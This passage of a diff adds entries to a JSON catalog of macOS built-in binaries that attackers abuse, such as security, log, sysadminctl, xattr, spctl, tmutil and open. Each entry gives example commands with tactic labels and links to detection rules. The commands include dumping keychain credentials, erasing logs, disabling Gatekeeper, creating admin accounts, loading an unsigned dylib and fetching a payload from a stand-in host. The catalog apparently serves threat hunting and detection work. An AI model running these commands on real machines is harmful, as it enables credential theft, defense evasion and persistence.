+        "detections": [
+            {
+                "name": "Sigma: Screen Capture - macOS",
+                "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_screencapture.yml"
+            }
+        ],
+        "resources": [
+            {
+                "name": "SS64 screencapture man page",
+                "url": "https://ss64.com/osx/screencapture.html"
+            }
+        ]
+    },
+    {
+        "name": "sfltool",
+        "author": "Eliott (@Koyiott)",
+        "short_description": "Binary to manage the Shared File List framework.",
+        "full_description": "sfltool allows interactions with the Shared File List framework, which can be used to modify application recent documents, favorites, and more.",
+        "created": "2023-09-12",
+        "example_use_cases": [
+            {
+                "name": "Display Login Items",
+                "description": "Identify all current login and background items configured on the system.",
+                "code": "sfltool dumpbtm",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "bash",
+                    "startup"
+                ]
+            },
+            {
+                "name": "Reset Login Items to Defaults",
+                "description": "Reset all third-party Login Items and revert to installation defaults.",
+                "code": "sfltool resetbtm",
+                "tactics": [
+                    "Defense Evasion"
+                ],
+                "tags": [
+                    "bash",
+                    "system_reset"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/sfltool"
+        ],
+        "detections": [
+            {
+                "name": "Jamf Protect: Detect attempts to dump BTM or being reverted to installation defaults",
+                "url": "https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/sfltool_activity"
+            }
+        ],
+        "resources": [
+            {
+                "name": "sfltool man page",
+                "url": "https://www.unix.com/man-page/mojave/1/sfltool/"
+            },
+            {
+                "name": "Controlling login and background items",
+                "url": "https://eclecticlight.co/2023/02/15/controlling-login-and-background-items-in-ventura/"
+            }
+        ]
+    },
+    {
+        "name": "log",
+        "author": "Brendan Chamberlain (@infosecB)",
+        "short_description": "Access system log messages from Apple Unified Logging (AUL).",
+        "full_description": "The log command can be used to access system log messages from Apple Unified Logging (AUL). The tool can be used to inspect exiting logs, stream logs in realtime, and delete logs. This tool is normally used by system admins and application developers for troubleshooting purposes but can be used by an adversary to gain an understanding of the user's behavior or to cover up their tracks by deleting log messages.",
+        "created": "2023-06-06",
+        "example_use_cases": [
+            {
+                "name": "Remove all log messages",
+                "description": "An attacker can cover up their tracks by removing all log messages using the following command. Requires root privileges.",
+                "code": "log erase --all",
+                "tactics": [
+                    "Defense Evasion"
+                ],
+                "tags": [
+                    "requires_root"
+                ]
+            },
+            {
+                "name": "Search log messages for tokens",
+                "description": "An attacker can potentially search log messages and review if they do contain sensitive information like jwt tokens.",
+                "code": "log show --info --debug --predicate 'eventMessage CONTAINS[d] \"eyJ\"'",
+                "tactics": [
+                    "Credential Access"
+                ],
+                "tags": [
+                    "bash",
+                    "zsh"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/log"
+        ],
+        "detections": [
+            {
+                "name": "No detections at time of publishing",
+                "url": "N/A"
+            }
+        ],
+        "resources": [
+            {
+                "name": "Living off the land in macOS (Daniel Stinson)",
+                "url": "https://shellcromancer.io/posts/living-off-of-macos/"
+            }
+        ],
+        "acknowledgements": [
+            "Daniel Stinson (@shellcromancer)"
+        ]
+    },
+    {
+        "name": "security",
+        "author": "Pratik Jeware (@Pratik-987), Brendan Chamberlain (@infosecb)",
+        "short_description": "Interact with Keychain, macOS's built-in password manager.",
+        "full_description": "security is a command-line utility included in macOS that allows users to interact with the Keychain app. Keychains allow users to manager passwords and credentials for many services and features, including Wi-Fi and website passwords, secure notes, certificates, and Kerberos.",
+        "created": "2023-04-24",
+        "example_use_cases": [
+            {
+                "name": "Dump credentials, keys, certificates, and other senstive information from Keychain",
+                "description": "This command will dump keychain passwords from login.keychain",
+                "code": "sudo security dump-keychain -d login.keychain",
+                "tactics": [
+                    "Credential Access"
+                ],
+                "tags": [
+                    "bash"
+                ]
+            },
+            {
+                "name": "Retrieve Chrome's \"Chrome Safe Storage\" password manager secret",
+                "description": "This command will retrieve the Chrome Safe Storage password manager secret from the keychain.",
+                "code": "security find-generic-password -w -s \"Chrome Safe Storage\"",
+                "tactics": [
+                    "Credential Access"
+                ],
+                "tags": [
+                    "bash",
+                    "chrome"
+                ]
+            },
+            {
+                "name": "Add an arbitrary trusted certificate to aid a MITM attack",
+                "description": "This command will add a certificate to the keychain.",
+                "code": "security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain bad_cert.crt",
+                "tactics": [
+                    "Defense Evasion"
+                ],
+                "tags": [
+                    "bash",
+                    "certificate"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/security"
+        ],
+        "detections": [
+            {
+                "name": "Sigma: Credentials from Password Stores - Keychain",
+                "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_creds_from_keychain.yml"
+            },
+            {
+                "name": "Elastic: Access to Keychain Credentials Directories",
+                "url": "https://github.com/elastic/detection-rules/blob/main/rules/macos/credential_access_credentials_keychains.toml"
+            },
+            {
+                "name": "Elastic: Credential Access Dumping Keychain Security",
+                "url": "https://github.com/elastic/detection-rules/blob/main/rules/macos/credential_access_dumping_keychain_security.toml"
+            },
+            {
+                "name": "Elastic: Keychain Password Retrieval via Command Line",
+                "url": "https://github.com/elastic/detection-rules/blob/main/rules/macos/credential_access_keychain_pwd_retrieval_security_cmd.toml"
+            },
+            {
+                "name": "Jamf Protect: Detect Keychain dumping using security",
+                "url": "https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/keychain_dumped"
+            }
+        ],
+        "resources": [
+            {
+                "name": "Using the OS X Keychain to store and retrieve passwords",
+                "url": "https://www.netmeister.org/blog/keychain-passwords.html"
+            },
+            {
+                "name": "SS64 security man page",
+                "url": "https://ss64.com/osx/security.html"
+            }
+        ]
+    },
+    {
+        "name": "codesign",
+        "author": "Thijs Xhaflaire",
+        "short_description": "Create, manipulate and verify code signatures.",
+        "full_description": "The codesign command is used to create, check, and display code signatures, as well as inquire into the dynamic status of signed code in the system.",
+        "created": "2024-07-29",
+        "example_use_cases": [
+            {
+                "name": "Ad-hod codesigning an app bundle",
+                "description": "This command forcefully re-signs the MyApp.app application with an ad-hoc signature, applying the signature deeply to all nested code within the app",
+                "code": "codesign --force --deep -s - MyApp.app",
+                "tactics": [
+                    "Defense Evasion"
+                ],
+                "tags": [
+                    "codesign"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/codesign"
+        ],
+        "detections": [
+            {
+                "name": "Jamf Protect: Detect ad-hod codesigning activity",
+                "url": "https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/adhoc_codesigning"
+            }
+        ],
+        "resources": [
+            {
+                "name": "When Apple Admits macOS Malware Is A Problem – It’s Time To Take Notice",
+                "url": "https://www.sentinelone.com/blog/when-apple-admits-macos-malware-is-a-problem-its-time-to-take-notice/"
+            },
+            {
+                "name": "codesign man page",
+                "url": "https://ss64.com/mac/codesign.html"
+            }
+        ]
+    },
+    {
+        "name": "systemsetup",
+        "author": "Hare Sudhan (@cyb3rbuff)",
+        "short_description": "Enable remote login, remote apple events for the machine",
+        "full_description": "systemsetup configures certain per-machine settings typically configured in the System Preferences application.\nThe systemsetup command requires at least \"admin\" privileges to run.\n",
+        "created": "2023-08-31",
+        "example_use_cases": [
+            {
+                "name": "Enable Remote Login",
+                "description": "systemsetup can be used to enable SSH for remote login",
+                "code": "sudo systemsetup -setremotelogin on\n",
+                "tactics": [
+                    "Lateral Movement"
+                ],
+                "tags": [
+                    "ssh",
+                    "configuration"
+                ]
+            },
+            {
+                "name": "Enable Remote Apple Events",
+                "description": "systemsetup can be used to enable Remote Apple Events. \nSet whether the system responds to events sent by other computers (such as AppleScripts).\n",
+                "code": "sudo systemsetup -setremoteappleevents on\n",
+                "tactics": [
+                    "Lateral Movement"
+                ],
+                "tags": [
+                    "configuration"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/sbin/systemsetup"
+        ],
+        "detections": [
+            {
+                "name": "Command line argument detection containing (args contain systemsetup AND (-setremoteappleevents OR -setremotelogin) AND on)",
+                "url": "https://www.elastic.co/guide/en/security/current/remote-ssh-login-enabled-via-systemsetup-command.html"
+            },
+            {
+                "name": "Jamf Protect: Detect systemsetup activity that enables remotelogin or appleremoteevents",
+                "url": "https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/systemsetup_activity"
+            }
+        ],
+        "resources": [
+            {
+                "name": "systemsetup man page",
+                "url": "https://ss64.com/osx/systemsetup.html"
+            }
+        ]
+    },
+    {
+        "name": "mdls",
+        "author": "Daniel Stinson-Diess (@shellcromancer)",
+        "short_description": "List metadata attributes for the specified file.",
+        "full_description": "mdls list file metadata across standard metadata (creation date, size), extended attribute (quarantine), and Spotlight APIs (Finder flags).",
+        "created": "2023-05-29",
+        "example_use_cases": [
+            {
+                "name": "Validate file download information",
+                "description": "Use mdls to validate payload download sources and timestamps to guard against sandbox executions.",
+                "code": "mdls -name \"kMDItemWhereFroms\" -name \"kMDItemDownloadedDate\"",
+                "tactics": [
+                    "Defense Evasion"
+                ],
+                "tags": [
+                    "Genieo",
+                    "Shlayer"
+                ]
+            },
+            {
+                "name": "Query File Paths",
+                "description": "Use mdls to print file paths and sizes when enumerating host resources.",
+                "code": "xargs -0 mdls -n kMDItemPath -n kMDItemFSSize",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "CleanMaster"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/mdls"
+        ],
+        "detections": [
+            {
+                "name": "No detections at time of publishing",
+                "url": "N/A"
+            }
+        ]
+    },
+    {
+        "name": "sysadminctl",
+        "author": "Hare Sudhan (@cyb3rbuff)",
+        "short_description": "Create/delete local accounts, guest account, enable SMB/AFP Guest access.",
+        "full_description": "sysadminctl can administer system user accounts. sysadminctl can be used to change user passwords, create new \nusers (including automatically provisioning the user home folder) or to check the status of a user's SecureToken.\n",
+        "created": "2024-11-19",
+        "example_use_cases": [
+            {
+                "name": "Enable Guest Account",
+                "description": "sysadminctl can be used to enable the guest account",
+                "code": "sudo sysadminctl -guestAccount on\n",
+                "tactics": [
+                    "Initial Access"
+                ]
+            },
+            {
+                "name": "Create Local User Account",
+                "description": "sysadminctl can be used to create a local user account",
+                "code": "sudo sysadminctl -addUser randomUser -password \"randomPassword\"\n",
+                "tactics": [
+                    "Persistence"
+                ],
+                "tags": [
+                    "users"
+                ]
+            },
+            {
+                "name": "Create a Local Admin Account",
+                "description": "sysadminctl can be used to create a local admin account",
+                "code": "sudo sysadminctl -addUser randomUser -password \"randomPassword\" -admin\n",
+                "tactics": [
+                    "Persistence"
+                ],
+                "tags": [
+                    "users"
+                ]
+            },
+            {
+                "name": "Reset user password",
+                "description": "sysadminctl can be used to reset password for a particular user account",
+                "code": "sudo sysadminctl -resetPasswordFor randomUser -newPassword \"randomPassword\"\n",
+                "tactics": [
+                    "Persistence"
+                ],
+                "tags": [
+                    "password",
+                    "users"
+                ]
+            },
+            {
+                "name": "Delete a local account",
+                "description": "sysadminctl can delete the specified user account",
+                "code": "sudo sysadminctl -deleteUser randomUser\n",
+                "tactics": [
+                    "Impact"
+                ],
+                "tags": [
+                    "users"
+                ]
+            },
+            {
+                "name": "Enable SMB Guest Access",
+                "description": "sysadminctl can enable SMB Guest Access",
+                "code": "sudo sysadminctl -smbGuestAccess on\n",
+                "tactics": [
+                    "Exfiltration"
+                ]
+            },
+            {
+                "name": "Enable AFP Guest Access",
+                "description": "sysadminctl can enable AFP Guest Access",
+                "code": "sudo sysadminctl -afpGuestAccess on\n",
+                "tactics": [
+                    "Exfiltration"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/sbin/sysadminctl"
+        ],
+        "detections": [
+            {
+                "name": "Sigma: Creation Of A Local User Account",
+                "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_create_account.yml"
+            },
+            {
+                "name": "Sigma: User Added To Admin Group Via Sysadminctl",
+                "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_sysadminctl_add_user_to_admin_group.yml"
+            },
+            {
+                "name": "Sigma: Guest Account Enabled Via Sysadminctl",
+                "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_sysadminctl_enable_guest_account.yml"
+            }
+        ],
+        "resources": [
+            {
+                "name": "sysadminctl man page",
+                "url": "https://ss64.com/mac/sysadminctl.html"
+            }
+        ]
+    },
+    {
+        "name": "plutil",
+        "author": "Brendan Chamberlain (@infosecB)",
+        "short_description": "Read, create or edit plist files.",
+        "full_description": "plutil is a command-line utility used for managing property list (.plist) files. These files are commonly used by macOS to store a app settings and other configuration info. The utility allows users to check the validity of plist files `plutil -lint`, convert plist files between XML and binary formats (plutil -convert), and add, modify or remove plist key value pairs.",
+        "created": "2023-05-07",
+        "example_use_cases": [
+            {
+                "name": "Set app to run with dock icon hidden",
+                "description": "plutil can be used to set the \"LSUIElement\" attribute to tue which will force the targeted app to run without the UI and dock icon.",
+                "code": "plutil -insert LSUIElement -string \"1\" /Applications/TargetApp.app/Contents/Info.plist",
+                "tactics": [
+                    "Defense Evasion"
+                ],
+                "tags": [
+                    "plist"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/plutil"
+        ],
+        "detections": [
+            {
+                "name": "Splunk Security Content: MacOS plutil",
+                "url": "https://research.splunk.com/endpoint/c11f2b57-92c1-4cd2-b46c-064eafb833ac/"
+            }
+        ],
+        "resources": [
+            {
+                "name": "Editing Property Lists with plutil",
+                "url": "https://scriptingosx.com/2016/11/editing-property-lists/"
+            },
+            {
+                "name": "Plist File Modification (MITRE ATT&CK)",
+                "url": "https://attack.mitre.org/techniques/T1647/"
+            }
+        ]
+    },
+    {
+        "name": "dns-sd",
+        "author": "Brendan Chamberlain (@infosecB)",
+        "short_description": "Discover local network services using the DNS-Based Service Discovery (SD) protocol.",
+        "full_description": "dns-sd can be used to interact with the Multicast DNS (mDNS) and DNS Service Discovery (DNS-SD) protocols. The tool is useful for administrators but can also be abused by malicious actors to discover local network services.",
+        "created": "2023-05-19",
+        "example_use_cases": [
+            {
+                "name": "Discover SSH hosts",
+                "description": "Hosts serving SSH can be discovered using the _ssh._tcp service string.",
+                "code": "dns-sd -B _ssh._tcp",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "network"
+                ]
+            },
+            {
+                "name": "Discover web hosts",
+                "description": "Hosts serving web services can be discovered using the _http._tcp service string.",
+                "code": "dns-sd -B _http._tcp",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "network"
+                ]
+            },
+            {
+                "name": "Discover hosts serving remote screen sharing",
+                "description": "Hosts serving remote screen sharing can be discovered using the _rfb._tcp service string.",
+                "code": "dns-sd -B _rfb._tcp",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "network"
+                ]
+            },
+            {
+                "name": "Discover hosts serving SMB",
+                "description": "Hosts serving SMB can be discovered using the _smb._tcp service string.",
+                "code": "dns-sd -B _smb._tcp",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "network"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/dns-sd"
+        ],
+        "detections": [
+            {
+                "name": "Jamf Protect: Detect dns-sd discovery activity",
+                "url": "https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/dns_service_discovery"
+            }
+        ],
+        "resources": [
+            {
+                "name": "What does APT Activity Look Like on macOS?",
+                "url": "https://themittenmac.com/what-does-apt-activity-look-like-on-macos"
+            },
+            {
+                "name": "mDNS / Bonjour Bible - List of Common Service Strings for various vendors",
+                "url": "https://jonathanmumm.com/tech-it/mdns-bonjour-bible-common-service-strings-for-various-vendors/"
+            }
+        ],
+        "acknowledgements": [
+            "Chris Ross, Cedric Owens: Farming The Apple Orchards: Living Off The Land Techniques"
+        ]
+    },
+    {
+        "name": "sysctl",
+        "author": "Cedric Owens (@cedowens)",
+        "short_description": "Get macOS hardware model information.",
+        "full_description": "Gets the macOS hardware information, which can be used to determine whether the target macOS host is running on a physical or virtual machine.",
+        "created": "2023-04-20",
+        "example_use_cases": [
+            {
+                "name": "Use sysctl to gather macOS hardware info.",
+                "description": "sysctl can be used to gather interesting macOS host data, including hardware information, memory size, logical cpu information, etc.",
+                "code": "sysctl -n hw.model",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "bash",
+                    "oneliner",
+                    "sysctl"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/sbin/sysctl"
+        ],
+        "detections": [
+            {
+                "name": "Jamf Protect: Detect activity related to sysctl in an interactive shell",
+                "url": "https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/sysctl_activity"
+            }
+        ],
+        "resources": [
+            {
+                "name": "Evasions: macOS",
+                "url": "https://evasions.checkpoint.com/src/MacOS/macos.html"
+            }
+        ]
+    },
+    {
+        "name": "tmutil",
+        "author": "Brendan Chamberlain (@infosecb)",
+        "short_description": "Manage Time Machine backups.",
+        "full_description": "A tool for managing Time Machine, the native macOS backup utility.",
+        "created": "2023-05-01",
+        "example_use_cases": [
+            {
+                "name": "Disable Time Machine",
+                "description": "The following command disables Time Machine. An attacker can use this to prevent backups from occurring.",
+                "code": "tmutil disable",
+                "tactics": [
+                    "Impact"
+                ],
+                "tags": [
+                    "backup"
+                ]
+            },
+            {
+                "name": "Delete a backup",
+                "description": "The following command deletes the specified backup. An adversary may perform this action before launching a ransonware attack to prevent the victim from restoring their files.",
+                "code": "tmutil delete /path/to/backup",
+                "tactics": [
+                    "Impact"
+                ],
+                "tags": [
+                    "delete"
+                ]
+            },
+            {
+                "name": "Restore a backup",
+                "description": "The following command restore the specified backup. An attacker can use this to restore a backup of a sensitive file that was deleted.",
+                "code": "tmutil restore /path/to/backup",
+                "tactics": [
+                    "Collection"
+                ],
+                "tags": [
+                    "restore"
+                ]
+            },
+            {
+                "name": "Tamper with system logs",
+                "description": "An adversary can use the snapshot and restore commands together to tamper with system logs. This is fixed in macOS 10.15.4+.",
+                "code": "mkdir /tmp/snapshot\ntmutil localsnapshot\ntmutil listlocalsnapshots /\nmount_apfs -o noowners -s com.apple.TimeMachine.2023-05-01-090000.local /System/Volumes/Data /tmp/snapshot\nopen /tmp/snapshot\nsudo vim /var/log/system.log\ntmutil restore com.apple.TimeMachine.2023-05-01-090000.local",
+                "tactics": [
+                    "Privilege Escalation"
+                ],
+                "tags": [
+                    "unprivileged"
+                ]
+            },
+            {
+                "name": "Exclude path from backup",
+                "description": "An adversary could exclude a path from Time Machine backups to prevent certain files from being backed up.",
+                "code": "tmutil addexclusion /path/to/exclude",
+                "tactics": [
+                    "Defense Evasion"
+                ],
+                "tags": [
+                    "backup"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/tmutil"
+        ],
+        "detections": [
+            {
+                "name": "Jamf Protect: Detect the deletion of localsnapshots",
+                "url": "https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/tmutil_activity"
+            },
+            {
+                "name": "Sigma: Time Machine Backup Deletion Attempt Via Tmutil - MacOS",
+                "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_tmutil_delete_backup.yml"
+            },
+            {
+                "name": "Sigma: Time Machine Backup Disabled Via Tmutil - MacOS",
+                "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_tmutil_disable_backup.yml"
+            },
+            {
+                "name": "Sigma: New File Exclusion Added To Time Machine Via Tmutil - MacOS",
+                "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_tmutil_exclude_file_from_backup.yml"
+            }
+        ],
+        "resources": [
+            {
+                "name": "mount_apfs TCC bypass and privilege escalation",
+                "url": "https://theevilbit.github.io/posts/cve_2020_9771/"
+            },
+            {
+                "name": "Manage Time Machine backups",
+                "url": "https://github.molgen.mpg.de/pages/bs/macOSnotes/mac/mac_files_tmutil.html"
+            },
+            {
+                "name": "Living-off-the-Land: Exploring macOS LOOBins and Crafting Detection Rules - tmutil",
+                "url": "https://danielcortez.substack.com/p/living-off-the-land-exploring-macos-0fd"
+            }
+        ]
+    },
+    {
+        "name": "textutil",
+        "author": "ezaspy",
+        "short_description": "Manipulate text files in various formats.",
+        "full_description": "The textutil binary is a command-line utility included in macOS that allows users to manipulate text files of various formats, using the mechanisms provided by the Cocoa text system. Formats include rtf, html, docx and others",
+        "created": "2023-05-05",
+        "example_use_cases": [
+            {
+                "name": "Use the textutil to read several files and build a new file",
+                "description": "A one-liner can load the content of multiple RTF files in a directory, concatenate their contents, and write the results out as a new file. This provides two sub-use-cases; one is building a malicious file from a collection of smaller files which could evade both network and host-based security controls as the traditional means of signature-based detection would be redundant; two is concatenating the content of several, potentially sensitive files before exfiltration. This command can also be looped to iterate a directory of files.",
+                "code": "textutil -convert html Quote.doc secondQuote.doc",
+                "tactics": [
+                    "Defense Evasion",
+                    "Collection"
+                ],
+                "tags": [
+                    "bash",
+                    "oneliner",
+                    "textutil"
+                ]
+            },
+            {
+                "name": "Capture clipboard content",
+                "description": "By leveraging another command line tool, pbpaste, it is possible to write a one-liner which captures the content of the clipboard. If an attacker already has access to the system, the attacker could run this command to obtain sensitive information such as a password and then elevate their privileges or exfiltrate the information.",
+                "code": "pbpaste | textutil -stdin -info > Clipboard.txt",
+                "tactics": [
+                    "Credential Access",
+                    "Collection"
+                ],
+                "tags": [
+                    "bash",
+                    "oneliner",
+                    "textutil",
+                    "pbpaste",
+                    "clipboard"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/textutil"
+        ],
+        "detections": [
+            {
+                "name": "Command Line Argument Detection (args contain textutil AND (-convert OR -stdin OR pbpaste))",
+                "url": "n/a"
+            }
+        ],
+        "resources": [
+            {
+                "name": "textutil",
+                "url": "https://osxdaily.com/tag/textutil/"
+            }
+        ]
+    },
+    {
+        "name": "ssh-keygen",
+        "author": "Leo Pitt (@_D00mfist)",
+        "short_description": "Load unsigned dynamic libraries into the ssh-keygen binary.",
+        "full_description": "ssh-keygen is a tool for creating new authentication key pairs for SSH (Secure Shell). ssh-keygen holds the \"com.apple.security.cs.disable-library-validation\" entitlement and is capable of loading arbitrary libraries without requiring signed code.",
+        "created": "2023-05-22",
+        "example_use_cases": [
+            {
+                "name": "Execute malicious dynamic library (.dylib) from standard input",
+                "description": "An attacker can execute a malicious .dylib from stdin by echoing a load command and piping to tclsh. This will bypass code signing requirements.",
+                "code": "ssh-keygen -D /private/tmp/evil.dylib",
+                "tactics": [
+                    "Execution",
+                    "Defense Evasion"
+                ],
+                "tags": [
+                    "dylib"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/ssh-keygen"
+        ],
+        "detections": [
+            {
+                "name": "Recommendations included in resource below. No formal detection content at this time.",
+                "url": "https://medium.com/@D00MFist/generate-keys-or-generate-dylib-loads-c99ed48f323d"
+            }
+        ],
+        "resources": [
+            {
+                "name": "Generate Keys or Generate Dylib Loads?",
+                "url": "https://medium.com/@D00MFist/generate-keys-or-generate-dylib-loads-c99ed48f323d"
+            }
+        ]
+    },
+    {
+        "name": "xattr",
+        "author": "Jason Trost (@jason_trost)",
+        "short_description": "Display and manipulate extended attributes.",
+        "full_description": "The xattr command can be used to display, modify or remove the extended attributes of one or more files, including directories and symbolic links.  Extended attributes are arbitrary metadata stored with a file, but separate from the filesystem attributes (such as modification time or file size).  The metadata is often a null-terminated UTF-8 string, but can also be arbitrary binary data.  xattr can be used to bypass Gatekeeper.",
+        "created": "2023-04-20",
+        "example_use_cases": [
+            {
+                "name": "Bypass Gatekeeper via xattr",
+                "description": "Use xattr to remove quaratine extended attribute from a file.",
+                "code": "xattr -d com.apple.quarantine FILE",
+                "tactics": [
+                    "Execution",
+                    "Defense Evasion"
+                ],
+                "tags": [
+                    "xattr",
+                    "quarantine"
+                ]
+            },
+            {
+                "name": "Bypass Gatekeeper via xattr",
+                "description": "Use xattr to remove quaratine extended attribute from multiple files or directories.",
+                "code": "xattr -d -r com.apple.quarantine *",
+                "tactics": [
+                    "Execution",
+                    "Defense Evasion"
+                ],
+                "tags": [
+                    "xattr",
+                    "quarantine"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/xattr"
+        ],
+        "detections": [
+            {
+                "name": "Gatekeeper Bypass via Xattr",
+                "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_xattr_gatekeeper_bypass.yml"
+            },
+            {
+                "name": "Jamf Protect: Detect activity related to xattr and extended attributes",
+                "url": "https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/xattr_extended_attributes_activity"
+            }
+        ],
+        "resources": [
+            {
+                "name": "Threat Hunting the macOS edition Megan Carney (Report)",
+                "url": "https://megancarney.com/presentations/ExternalReport_ThreatHuntingMacOS.pdf"
+            },
+            {
+                "name": "GrrCon 2018: Threat Hunting the macOS edition Megan Carney",
+                "url": "https://www.youtube.com/watch?v=_K4gnSuDkRM&feature=youtu.be"
+            }
+        ]
+    },
+    {
+        "name": "say",
+        "author": "Pinar Sadioglu (@p_sadioglu)",
+        "short_description": "Convert text to audible speech.",
+        "full_description": "This tool uses the Speech Synthesis manager to convert input text to audible speech and either play it through the sound output device chosen in System Preferences or save it to an AIFF file.",
+        "created": "2023-11-17",
+        "example_use_cases": [
+            {
+                "name": "Read sensitive data",
+                "description": "The following command can read and process sensitive files and redirects the output to a file..",
+                "code": "say -f /home/user/sensitive-files -i  > loot.txt;",
+                "tactics": [
+                    "Defense Evasion",
+                    "Collection"
+                ],
+                "tags": [
+                    "bash"
+                ]
+            },
+            {
+                "name": "Collect clipboard data",
+                "description": "The command is designed to enhance privacy by muting the system volume,using a less recognizable \"Whisper\" voice with the \"say\" command, processing the copied text in the clipboard, and saving the output to a file named \"loot.txt.\"",
+                "code": "osascript -e 'set volume output muted true' ;   say $(pbpaste) -i  > loot.txt;",
+                "tactics": [
+                    "Defense Evasion",
+                    "Reconnaissance",
+                    "Discovery",
+                    "Collection"
+                ],
+                "tags": [
+                    "pbpaste",
+                    "clipboard",
+                    "bash",
+                    "osascript"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/say"
+        ],
+        "detections": [
+            {
+                "name": "No detection content available",
+                "url": "N/A"
+            }
+        ],
+        "resources": [
+            {
+                "name": "say man page",
+                "url": "https://ss64.com/osx/say.html"
+            }
+        ]
+    },
+    {
+        "name": "open",
+        "author": "Brendan Chamberlain (@infosecb)",
+        "short_description": "Open files, folders, apps, URLs, and header files.",
+        "full_description": "The open command-line utility can be used to open files, folders, app, URLs or header files in their associate macOS app.",
+        "created": "2023-05-10",
+        "example_use_cases": [
+            {
+                "name": "Open a malicious file",
+                "description": "The open command can be used to open a malicious macOS app from the terminal.",
+                "code": "open Malicious.app",
+                "tactics": [
+                    "Execution"
+                ],
+                "tags": [
+                    "app"
+                ]
+            },
+            {
+                "name": "Download a malicious file",
+                "description": "The following command downloads the payload.zip file in the default browser (Safari) and then kills it.",
+                "code": "open -g https://mypayload.io/payload.zip; sleep 3; killall Safari",
+                "tactics": [
+                    "Execution"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/open"
+        ],
+        "detections": [
+            {
+                "name": "No detections at time of publishing",
+                "url": "N/A"
+            }
+        ],
+        "resources": [
+            {
+                "name": "The macOS open Command",
+                "url": "https://scriptingosx.com/2017/02/the-macos-open-command/"
+            }
+        ]
+    },
+    {
+        "name": "scutil",
+        "author": "Ethan Nay",
+        "short_description": "Display basic network information, check the dns config, set the computer hostname and perform several other tasks.",
+        "full_description": "scutil provides a command line interface to the dynamic store data maintained by configd. Interaction with this data (using the SystemConfiguration.framework SCDynamicStore APIs) is handled with a set of commands read from standard input.",
+        "created": "2023-06-21",
+        "example_use_cases": [
+            {
+                "name": "DNS configuration",
+                "description": "Get the current DNS configuration of the systems",
+                "code": "scutil --dns",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "network"
+                ]
+            },
+            {
+                "name": "Proxy configuration",
+                "description": "Get the current proxy configuration of the systems",
+                "code": "scutil --proxy",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "network",
+                    "configuration"
+                ]
+            },
+            {
+                "name": "Network reachability",
+                "description": "Check if the destination host is reachable from your Mac",
+                "code": "scutil -r { nodename | address | local-address remote-address }",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "network",
+                    "configuration"
+                ]
+            },
+            {
+                "name": "Hostname, localhost name and computername",
+                "description": "Display the current hostname, localhost name and computername",
+                "code": "scutil --get { HostName | LocalHostName | ComputerName }",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "configuration"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/scutil"
+        ],
+        "detections": [
+            {
+                "name": "No detections at time of publishing",
+                "url": "N/A"
+            }
+        ],
+        "resources": [
+            {
+                "name": "macOS/binaries/scutil",
+                "url": "https://macosbin.com/bin/scutil"
+            },
+            {
+                "name": "scutil man page",
+                "url": "https://ss64.com/osx/scutil.html"
+            }
+        ]
+    },
+    {
+        "name": "spctl",
+        "author": "Brendan Chamberlain (@infosecB)",
+        "short_description": "Manage the security assessment policy subsystem, Gatekeeper settings, and control which apps are allowed to run on the system.",
+        "full_description": "Manage the security assessment policy subsystem, Gatekeeper settings, and control which apps are allowed to run on the system.",
+        "created": "2023-05-23",
+        "example_use_cases": [
+            {
+                "name": "Disable Gatekeeper",
+                "description": "The --master-disable switch disables Gatekeeper. The command must be run with root/sudo permission.",
+                "code": "sudo spctl --master-disable",
+                "tactics": [
+                    "Defense Evasion"
+                ],
+                "tags": [
+                    "gatekeeper"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/sbin/spctl"
+        ],
+        "detections": [
+            {
